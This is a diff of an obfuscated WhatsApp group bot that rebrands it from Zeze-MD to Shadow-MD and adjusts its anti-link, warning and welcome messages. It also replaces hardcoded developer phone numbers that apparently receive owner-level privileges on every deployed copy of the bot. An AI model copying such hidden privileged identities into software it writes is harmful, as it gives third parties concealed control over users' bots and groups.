@@ -91,7 +91,7 @@ const {
 let {
   reagir
 } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/Zeze-MD-WHATSAPP-BOT;;;=>/g, '');
+var session = conf.session.replace(/Shadow-MD-WHATSAPP-BOT;;;=>/g, '');
 const prefixe = conf.PREFIXE;
 async function authentification() {
   try {
@@ -131,7 +131,7 @@ setTimeout(() => {
       'logger': pino({
         'level': 'silent'
       }),
-      'browser': ["Zeze-MD", 'Safari'],
+      'browser': ["Shadow-MD", 'Safari'],
       'printQRInTerminal': true,
       'markOnlineOnConnect': false,
       'auth': {
@@ -192,10 +192,10 @@ setTimeout(() => {
       } = require('./bdd/sudo');
       const _0x5f17e2 = _0x2d5aec.pushName;
       const _0x11cc11 = await _0xfa9eab();
-      const _0xaaac2 = [_0x419d8a, "255682937675", '255760109840', conf.NUMERO_OWNER].map(_0x5d6e53 => _0x5d6e53.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const _0xaaac2 = [_0x419d8a, "255746476002", '255746476002', conf.NUMERO_OWNER].map(_0x5d6e53 => _0x5d6e53.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const _0x2d4141 = _0xaaac2.concat(_0x11cc11);
       const _0x401f81 = _0x2d4141.includes(_0x395177);
-      var _0x103bad = ["255682937675", '255760109840'].map(_0x3aa99c => _0x3aa99c.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x395177);
+      var _0x103bad = ["255746476002", '255746476002'].map(_0x3aa99c => _0x3aa99c.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x395177);
       function _0x40eeea(_0x7b6b5f) {
         _0x435f24.sendMessage(_0xc9ddbb, {
           'text': _0x7b6b5f
@@ -203,7 +203,7 @@ setTimeout(() => {
           'quoted': _0x2d5aec
         });
       }
-      console.log("\tZeze-MD ONLINE ⚡");
+      console.log("\tSHADOW-MD ONLINE ⚡");
       console.log("==== Message Received ======");
       if (_0x2c1e60) {
         console.log("Message from group 🗨️: " + _0x32424a);
@@ -487,7 +487,7 @@ setTimeout(() => {
           }
           if (!_0x47d23e) {
             await _0x435f24.sendMessage(_0xc9ddbb, {
-              'text': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n❌ I'm not admin! Can't delete links."
+              'text': "SHADOW-𝐌𝐃\n\n❌ I'm not admin! Can't delete links."
             }, {
               'quoted': _0x2d5aec
             });
@@ -499,8 +499,8 @@ setTimeout(() => {
             'id': _0x2d5aec.key.id,
             'participant': _0x395177
           };
-          const _0x546527 = new Sticker("https://raw.githubusercontent.com/ZEZE47-MD/zeze/main/media/remover.gif", {
-            'pack': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃",
+          const _0x546527 = new Sticker("https://raw.githubusercontent.com/SHADOW-MD/shadow/main/media/remover.gif", {
+            'pack': "SHADOW-𝐌𝐃",
             'author': conf.OWNER_NAME,
             'type': StickerTypes.FULL,
             'categories': ['⚠️'],
@@ -511,7 +511,7 @@ setTimeout(() => {
           await _0x546527.toFile("st1.webp");
           const _0xc32578 = (await recupererActionJid(_0xc9ddbb)) || "delete";
           if (_0xc32578 === 'remove') {
-            const _0x27b302 = "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ LINK VIOLATION!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ ACTION: REMOVED\n◈━━━━━━━━━━━━━━━━◈";
+            const _0x27b302 = "SHADOW-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ LINK VIOLATION!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ ACTION: REMOVED\n◈━━━━━━━━━━━━━━━━◈";
             await _0x435f24.sendMessage(_0xc9ddbb, {
               'sticker': fs.readFileSync("st1.webp")
             }, {
@@ -529,7 +529,7 @@ setTimeout(() => {
               await _0x435f24.groupParticipantsUpdate(_0xc9ddbb, [_0x395177], "remove");
             } catch (_0x47cf45) {
               await _0x435f24.sendMessage(_0xc9ddbb, {
-                'text': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ REMOVAL FAILED!\n│❒ NEED ADMIN POWER\n◈━━━━━━━━━━━━━━━━◈"
+                'text': "SHADOW-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ REMOVAL FAILED!\n│❒ NEED ADMIN POWER\n◈━━━━━━━━━━━━━━━━◈"
               }, {
                 'quoted': _0x2d5aec
               });
@@ -540,7 +540,7 @@ setTimeout(() => {
             await fs.unlink("st1.webp");
           } else {
             if (_0xc32578 === "delete") {
-              const _0x1f4955 = "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ LINK DELETED!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ NEXT: WARNING\n◈━━━━━━━━━━━━━━━━◈";
+              const _0x1f4955 = "SHADOW-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ LINK DELETED!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ NEXT: WARNING\n◈━━━━━━━━━━━━━━━━◈";
               await _0x435f24.sendMessage(_0xc9ddbb, {
                 'sticker': fs.readFileSync("st1.webp")
               }, {
@@ -566,7 +566,7 @@ setTimeout(() => {
                 let _0x5894ab = await _0x533f0f(_0x395177);
                 let _0x77e7bd = conf.WARN_COUNT;
                 if (_0x5894ab >= _0x77e7bd) {
-                  const _0x344c00 = "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ MAX WARNINGS!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ ACTION: BANNED\n◈━━━━━━━━━━━━━━━━◈";
+                  const _0x344c00 = "SHADOW-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ MAX WARNINGS!\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ ACTION: BANNED\n◈━━━━━━━━━━━━━━━━◈";
                   await _0x435f24.sendMessage(_0xc9ddbb, {
                     'sticker': fs.readFileSync("st1.webp")
                   }, {
@@ -583,7 +583,7 @@ setTimeout(() => {
                     await _0x37552d(_0x395177);
                   } catch (_0xcb6ca7) {
                     await _0x435f24.sendMessage(_0xc9ddbb, {
-                      'text': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ BAN FAILED!\n│❒ NEED ADMIN\n◈━━━━━━━━━━━━━━━━◈"
+                      'text': "SHADOW-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ BAN FAILED!\n│❒ NEED ADMIN\n◈━━━━━━━━━━━━━━━━◈"
                     }, {
                       'quoted': _0x2d5aec
                     });
@@ -593,7 +593,7 @@ setTimeout(() => {
                   });
                 } else {
                   const _0x20de43 = _0x77e7bd - _0x5894ab;
-                  const _0x600bce = "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ WARNING #" + (_0x5894ab + 0x1) + "\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ LEFT: " + _0x20de43 + "\n◈━━━━━━━━━━━━━━━━◈";
+                  const _0x600bce = "SHADOW-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ WARNING #" + (_0x5894ab + 0x1) + "\n│❒ USER: @" + _0x395177.split('@')[0x0] + "\n│❒ LEFT: " + _0x20de43 + "\n◈━━━━━━━━━━━━━━━━◈";
                   await _0x32e2f8(_0x395177);
                   await _0x435f24.sendMessage(_0xc9ddbb, {
                     'sticker': fs.readFileSync("st1.webp")
@@ -618,7 +618,7 @@ setTimeout(() => {
       } catch (_0x2c1488) {
         console.log("Anti-link crash:", _0x2c1488);
         await _0x435f24.sendMessage(_0xc9ddbb, {
-          'text': "𝐙𝐄𝐙𝐄𝟒𝟕-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ SYSTEM ERROR!\n│❒ " + _0x2c1488.message + "\n◈━━━━━━━━━━━━━━━━◈"
+          'text': "SHADOW-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ SYSTEM ERROR!\n│❒ " + _0x2c1488.message + "\n◈━━━━━━━━━━━━━━━━◈"
         }, {
           'quoted': _0x2d5aec
         });
@@ -649,8 +649,8 @@ setTimeout(() => {
             'participant': _0x395177
           };
           var _0x5eeb47 = "bot detected, \n";
-          var _0x1dc067 = new Sticker('https://raw.githubusercontent.com/ZEZE47-MD/zeze/main/media/remover.gif', {
-            'pack': "Zeze-MD",
+          var _0x1dc067 = new Sticker('https://raw.githubusercontent.com/SHADOW-MD/shadow/main/media/remover.gif', {
+            'pack': "Shadow-MD",
             'author': conf.OWNER_NAME,
             'type': StickerTypes.FULL,
             'categories': ['🤩', '🎉'],
@@ -792,7 +792,7 @@ setTimeout(() => {
       try {
         const _0x42a42b = await _0x435f24.groupMetadata(_0x137d61.id);
         if (_0x137d61.action == 'add' && (await _0x2261e1(_0x137d61.id, 'welcome')) == 'on') {
-          let _0x52bb2a = "Zeze-MD";
+          let _0x52bb2a = "shadow-MD";
           let _0x2dd83b = _0x137d61.participants;
           for (let _0x5b0b9d of _0x2dd83b) {
             _0x52bb2a += " \n𝐇𝐞𝐥𝐥𝐨 @" + _0x5b0b9d.split('@')[0x0] + " 𝐀𝐍𝐃 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐎𝐔𝐑 𝐆𝐑𝐎𝐔𝐏.🌟WELCOME to each of you! 🤗\nWhether you're here to learn, grow, share, or just vibe — you're in the right place. Let's build something awesome together, support one another, and make this space feel like home. 💬💡✨..⭐ \n\n";
@@ -913,10 +913,10 @@ setTimeout(() => {
         connection: _0x22df24
       } = _0x5d646f;
       if (_0x22df24 === "connecting") {
-        console.log("ℹ️ Zeze MD is connecting...");
+        console.log("ℹ️ Shadow MD is connecting...");
       } else {
         if (_0x22df24 === 'open') {
-          console.log("✅ Zeze MD Connected to WhatsApp!");
+          console.log("✅ Shadow MD Connected to WhatsApp!");
           console.log('--');
           0x0;
           await baileys_1.delay(0xc8);
@@ -924,12 +924,12 @@ setTimeout(() => {
           0x0;
           await baileys_1.delay(0x12c);
           console.log("------------------/-----");
-          console.log("Zeze MD is Online ✅\n\n");
-          console.log("Loading Zeze Commands ...\n");
-          fs.readdirSync(__dirname + "/zezeplugins").forEach(_0x76f21e => {
+          console.log("Shadow MD is Online ✅\n\n");
+          console.log("Loading Shadow Commands ...\n");
+          fs.readdirSync(__dirname + "/shadow_plugins").forEach(_0x76f21e => {
             if (path.extname(_0x76f21e).toLowerCase() == ".js") {
               try {
-                require(__dirname + "/zezeplugins/" + _0x76f21e);
+                require(__dirname + "/shadow_plugins/" + _0x76f21e);
                 console.log(_0x76f21e + " Installed Successfully✔️");
               } catch (_0x303bca) {
                 console.log(_0x76f21e + " could not be installed due to : " + _0x303bca);
@@ -952,7 +952,7 @@ setTimeout(() => {
           await _0x55522b();
           if (conf.DP.toLowerCase() === "yes") {
             await _0x435f24.sendMessage(_0x435f24.user.id, {
-              'text': "      BOT RUNNING\n                ⁠              \n> 𝑫𝑬𝑽   :\nzeze_Tech\n> 𝑩𝑶𝑻   : \nZEZE-MD \n⁠⁠"
+              'text': "      BOT RUNNING\n                ⁠              \n> 𝑫𝑬𝑽   :\nshadow_Tech\n> 𝑩𝑶𝑻   : \nSHADOW-MD \n⁠⁠"
             });
           }
         } else {
